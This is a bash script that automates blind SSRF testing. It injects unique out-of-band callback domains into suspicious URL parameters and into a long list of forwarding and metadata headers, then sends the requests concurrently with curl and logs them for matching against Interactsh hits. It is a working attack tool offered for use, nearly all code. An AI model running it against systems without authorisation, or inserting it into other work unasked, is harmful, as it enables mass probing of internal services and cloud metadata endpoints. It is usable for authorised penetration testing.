#!/usr/bin/env bash
# ssrf_blinder_fixed.sh
# Usage: ssrf_blinder_fixed.sh -o <OAST_ROOT> -e <endpoints_file> [-h <headers_file>] [-c <concurrency>]
# Example:
#   ./ssrf_blinder_fixed.sh -o igquk...oast.fun -e ssrf.txt -h ssrf_headers.txt -c 40

set -euo pipefail
IFS=$'\n\t'

show_help() {
  cat <<EOF
Usage: $0 -o <OAST_ROOT> -e <endpoints_file> [-h <headers_file>] [-c <concurrency>]

 -o OAST root (e.g. igqukeo...oast.fun)
 -e endpoints file (ssrf.txt)
 -h headers file (optional). If omitted, a default header list is used.
 -c concurrency (optional, default 40)

Output (in ./ssrf_blinder_out):
 - tokens_map.tsv      (token<TAB>payload<TAB>type<TAB>target<TAB>meta<TAB>timestamp)
 - param_tests.txt     (one injected URL per matched endpoint)
 - sent_requests.log   (ts<TAB>token<TAB>payload<TAB>target<TAB>meta<TAB>http_code)
EOF
}

# parse flags
OAST_ROOT=""
ENDPOINTS_FILE=""
HEADERS_FILE=""
CONCURRENCY=40

while getopts ":o:e:h:c:?" opt; do
  case $opt in
    o) OAST_ROOT="$OPTARG" ;;
    e) ENDPOINTS_FILE="$OPTARG" ;;
    h) HEADERS_FILE="$OPTARG" ;;
    c) CONCURRENCY="$OPTARG" ;;
    \?|*) show_help; exit 2 ;;
  esac
done

if [[ -z "$OAST_ROOT" || -z "$ENDPOINTS_FILE" ]]; then
  show_help
  exit 2
fi

WORKDIR="./ssrf_blinder_out"
mkdir -p "$WORKDIR"

TOKENS_MAP="$WORKDIR/tokens_map.tsv"
PARAM_TESTS="$WORKDIR/param_tests.txt"
SENT_LOG="$WORKDIR/sent_requests.log"

: > "$TOKENS_MAP"
: > "$PARAM_TESTS"
: > "$SENT_LOG"

# Param keywords
PARAMS=(access admin dbg debug edit grant test alter clone create delete disable enable exec execute
load make modify rename reset shell toggle adm root cfg dest redirect uri path continue url
window next data reference site html val validate domain callback return page feed host port to out
view dir show navigation open file document folder pg php_path style doc img filename)
PARAMS_PY_REPR="["$(printf "'%s'," "${PARAMS[@]}" | sed "s/,$//")"]"

# headers: load or default
DEFAULT_HEADERS=(X-Forwarded-For X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto X-Real-IP X-Client-IP X-Remote-IP X-Original-URL X-Rewrite-URL Destination X-Host X-Original-Host Forwarded X-Requested-With X-Http-Method-Override X-Custom-IP-Authorization X-AWS-EC2-Metadata-URL X-GCE-Metadata-URL Metadata X-File-Path X-Path)
HEADERS=()
if [[ -n "$HEADERS_FILE" && -f "$HEADERS_FILE" ]]; then
  while IFS= read -r L || [[ -n "$L" ]]; do
    LTRIM=$(echo "$L" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    [[ -n "$LTRIM" ]] && HEADERS+=("$LTRIM")
  done < "$HEADERS_FILE"
else
  HEADERS=("${DEFAULT_HEADERS[@]}")
fi

# build Python literal for headers
HEADERS_PY_REPR="["$(printf "'%s'," "${HEADERS[@]}" | sed "s/,$//")"]"

echo "[INFO] OAST root: $OAST_ROOT"
echo "[INFO] endpoints: $ENDPOINTS_FILE"
echo "[INFO] headers: ${#HEADERS[@]}"
echo "[INFO] concurrency: $CONCURRENCY"
echo

# normalize line endings
if command -v sed >/dev/null 2>&1; then
  sed -i 's/\r$//' "$ENDPOINTS_FILE" || true
  if [[ -n "$HEADERS_FILE" ]]; then sed -i 's/\r$//' "$HEADERS_FILE" || true; fi
  sed -i 's/\r$//' "$0" || true
fi

# STEP 1: Build param tokens & tests (one per matched endpoint)
nl -ba "$ENDPOINTS_FILE" | while read -r idx url; do
  matched_key=$(python3 - <<PY
from urllib.parse import urlparse, parse_qsl
u = """${url}"""
p = urlparse(u)
qs_keys = [k.lower() for k,_ in parse_qsl(p.query)]
path_keys = [seg.lower() for seg in p.path.split('/') if seg]
all_keys = qs_keys + path_keys
param_list = ${PARAMS_PY_REPR}
found = None
for k in all_keys:
    if k in param_list:
        found = k; break
if found:
    print(found)
else:
    raw = u.lower()
    for cand in param_list:
        if ('?' + cand + '=') in raw or ('&' + cand + '=') in raw:
            print(cand); exit(0)
    exit(0)
PY
)
  if [[ -n "$matched_key" ]]; then
    token=$(printf "%s|%s|%s" "$idx" "$url" "$(date +%s%N)" | sha1sum | cut -c1-12)
    payload="${token}.${OAST_ROOT}"
    ts=$(date -Iseconds)
    echo -e "${token}\t${payload}\tPARAM\t${url}\tparam:${matched_key}\t${ts}" >> "$TOKENS_MAP"

    injected=$(python3 - <<PY
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
u = """${url}"""
p = urlparse(u)
qs = dict(parse_qsl(p.query))
qs["${matched_key}"] = "http://${payload}"
new_q = urlencode(qs, doseq=True)
print(urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment)))
PY
)
    echo "${injected}" >> "$PARAM_TESTS"
  fi
done

TOTAL_PARAMS=$(wc -l < "$PARAM_TESTS" || echo 0)
echo "[INFO] Created $TOTAL_PARAMS param tests (one per matched endpoint)."

# STEP 2: param worker (handles percent-encoded payloads)
WORKER_P="$(mktemp --suffix=_worker_param.sh)"
cat > "$WORKER_P" <<'WEND'
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'
LINE="$1"
SENT_LOG_PATH="__SENT_LOG_PATH_PLACEHOLDER__"
token_host=$(python3 - <<'PY'
import re
from urllib.parse import unquote, urlparse, parse_qs
u = """${LINE}"""
dec = unquote(u)
m = re.search(r'https?://([^/:&\?]+)', dec)
if m:
    print(m.group(1))
else:
    try:
        p = urlparse(dec)
        qs = parse_qs(p.query)
        for vals in qs.values():
            for v in vals:
                m2 = re.search(r'https?://([^/:&\?]+)', v)
                if m2:
                    print(m2.group(1)); raise SystemExit(0)
        print("")
    except Exception:
        print("")
PY
)
token=$(printf "%s" "$token_host" | cut -d'.' -f1)
payload="$token_host"
CURL=(--silent --max-time 12 --output /dev/null --write-out "%{http_code}")
http_code=$(curl "${CURL[@]}" "$LINE" 2>/dev/null) || http_code="ERR"
now=$(date -Iseconds)
printf "%s\t%s\t%s\t%s\tPARAM\t%s\n" "$now" "$token" "$payload" "$LINE" "$http_code" >> "$SENT_LOG_PATH"
WEND
sed -i "s|__SENT_LOG_PATH_PLACEHOLDER__|${SENT_LOG}|g" "$WORKER_P"
chmod +x "$WORKER_P"
sed -i 's/\r$//' "$WORKER_P" || true

echo "[INFO] Running param tests (concurrency=$CONCURRENCY)..."
if [[ -s "$PARAM_TESTS" ]]; then
  cat "$PARAM_TESTS" | xargs -d '\n' -P "$CONCURRENCY" -I '{}' "$WORKER_P" '{}'
else
  echo "[INFO] No param tests to run."
fi
rm -f "$WORKER_P"

# STEP 3: extract unique subdomains from TOKENS_MAP
python3 - <<PY > "$WORKDIR/tmp_subdomains.txt"
from urllib.parse import urlparse
seen=set()
with open("${TOKENS_MAP}","r") as f:
    for line in f:
        parts=line.strip().split('\t')
        if len(parts) < 4: continue
        orig = parts[3]
        try:
            net = urlparse(orig).netloc
            if net and net not in seen:
                print(net)
                seen.add(net)
        except Exception:
            pass
PY

NUM_SUBS=$(wc -l < "$WORKDIR/tmp_subdomains.txt" || echo 0)
echo "[INFO] Found $NUM_SUBS unique subdomain(s) to fuzz headers."

# STEP 4: build deterministic header job file and append mapping
JOB_FILE="$(mktemp)"
python3 - <<PY > "$JOB_FILE"
import hashlib
oast = """${OAST_ROOT}"""
headers = ${HEADERS_PY_REPR}
with open("${WORKDIR}/tmp_subdomains.txt","r") as f:
    subs=[s.strip() for s in f if s.strip()]
for sub in subs:
    for hdr in headers:
        token = hashlib.sha1((sub + "|" + hdr).encode()).hexdigest()[:12]
        payload = token + "." + oast
        print(sub + "\t" + token + "\t" + payload + "\tHDR:" + hdr)
PY

python3 - <<PY >> "$TOKENS_MAP"
from datetime import datetime
with open("${JOB_FILE}","r") as fh:
    for line in fh:
        sub,token,payload,meta = line.strip().split('\t',3)
        ts = datetime.now().isoformat()
        print(f"{token}\t{payload}\tHEADER\t{sub}\t{meta.replace('HDR:','HEADER:')}\t{ts}")
PY

# header worker (uses absolute SENT_LOG path)
WORKER_H="$(mktemp --suffix=_worker_header.sh)"
cat > "$WORKER_H" <<'WEND'
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'
LINE="$1"
SENT_LOG_PATH="__SENT_LOG_PATH_PLACEHOLDER__"
IFS=$'\t' read -r sub token payload meta <<< "$LINE" || true
hdr="${meta#HDR:}"
CURL=(--silent --max-time 12 --output /dev/null --write-out "%{http_code}")
tgt="https://${sub}"
http_code=$(curl "${CURL[@]}" -H "${hdr}: http://${payload}" "$tgt" 2>/dev/null) || http_code="ERR"
now=$(date -Iseconds)
printf "%s\t%s\t%s\t%s\tHEADER:%s\t%s\n" "$now" "$token" "$payload" "$tgt" "$hdr" "$http_code" >> "$SENT_LOG_PATH"
WEND
sed -i "s|__SENT_LOG_PATH_PLACEHOLDER__|${SENT_LOG}|g" "$WORKER_H"
chmod +x "$WORKER_H"
sed -i 's/\r$//' "$WORKER_H" || true

echo "[INFO] Sending header tests (headers × subdomains) ..."
if [[ -s "$JOB_FILE" ]]; then
  cat "$JOB_FILE" | xargs -d '\n' -P "$CONCURRENCY" -I '{}' "$WORKER_H" '{}'
else
  echo "[INFO] No header jobs to run."
fi

# cleanup
rm -f "$WORKER_H" "$JOB_FILE" "$WORKDIR/tmp_subdomains.txt"

echo
echo "[DONE] All requests sent."
echo "[FILES kept]"
echo " - tokens map: $TOKENS_MAP"
echo " - param tests: $PARAM_TESTS"
echo " - sent log: $SENT_LOG"
echo
echo "To map an Interactsh token -> what caused it:"
echo "  grep -P '^<token>\\t' \"$TOKENS_MAP\""
echo "  grep -P '\\t<token>\\t' \"$SENT_LOG\""
